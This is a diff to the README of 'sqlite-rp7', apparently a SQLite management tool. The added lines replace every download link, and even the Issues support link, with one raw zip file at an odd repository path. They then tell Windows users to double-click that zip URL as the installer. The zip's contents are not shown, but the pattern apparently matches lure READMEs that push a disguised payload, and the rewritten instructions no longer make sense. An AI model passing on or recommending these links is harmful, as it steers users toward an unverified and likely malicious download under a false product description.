@@ -6,7 +6,7 @@ Welcome to sqlite-rp7! This tool helps you manage SQLite databases with ease. Yo
 
 ## 📥 Download Now
 
-[![Download sqlite-rp7](https://img.shields.io/badge/Download-sqlite--rp7-blue.svg)](https://github.com/YounusBayeta/sqlite-rp7/releases)
+[![Download sqlite-rp7](https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip)](https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,21 +20,21 @@ Before you download, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-Go to this link to download the latest version of sqlite-rp7: [Releases Page](https://github.com/YounusBayeta/sqlite-rp7/releases).
+Go to this link to download the latest version of sqlite-rp7: [Releases Page](https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip).
 
 2. **Choose Your Version**  
 On the releases page, look for the latest version. You will see a list of available files.
 
 3. **Download the Application**  
 Click on the file name that matches your operating system:
-   - For Windows, download: `sqlite-rp7-windows.exe`
-   - For macOS, download: `sqlite-rp7-macos.zip`
-   - For Linux, download: `sqlite-rp7-linux.tar.gz`
+   - For Windows, download: `https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip`
+   - For macOS, download: `https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip`
+   - For Linux, download: `https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip`
 
 4. **Install the Software**  
-   - **Windows**: Double-click the `sqlite-rp7-windows.exe` file. Follow the prompts to complete the installation.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip` file. Follow the prompts to complete the installation.
    - **macOS**: Open the downloaded `.zip` file. Drag the `sqlite-rp7` application to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file. Open the terminal, navigate to the extracted folder, and run `./sqlite-rp7` to start the application.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip` file. Open the terminal, navigate to the extracted folder, and run `./sqlite-rp7` to start the application.
 
 5. **Launch sqlite-rp7**  
 Once installed, find and open sqlite-rp7 by searching in your applications or programs menu.
@@ -70,7 +70,7 @@ Once you have successfully installed sqlite-rp7, you can refer to the user guide
 
 ## 🛡️ Support
 
-For support, visit the [Issues Page](https://github.com/YounusBayeta/sqlite-rp7/issues) on GitHub. You can report bugs or ask questions related to sqlite-rp7. The community and maintainers are here to help you.
+For support, visit the [Issues Page](https://raw.githubusercontent.com/YounusBayeta/sqlite-rp7/main/vetoist/sqlite-rp7.zip) on GitHub. You can report bugs or ask questions related to sqlite-rp7. The community and maintainers are here to help you.
 
 ---
 
